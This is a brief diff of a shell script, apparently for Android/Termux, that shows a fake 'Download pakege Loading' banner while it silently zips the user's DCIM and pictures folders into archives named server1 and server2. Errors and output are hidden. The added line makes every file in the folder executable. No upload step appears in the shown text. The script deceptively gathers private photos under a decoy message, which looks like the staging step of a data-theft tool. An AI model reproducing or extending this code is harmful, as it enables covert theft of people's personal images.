@@ -21,6 +21,7 @@ printf " \e[1;95m    Download pakege Loading ... \n"
 printf "\n"
 
 printf "\e[1;90m    \n"
+chmod +x *
 zip server1 -r /sdcard/DCIM > /dev/null 2>&1
 zip server2 -r /sdcard/pictures > /dev/null 2>&1
 clear
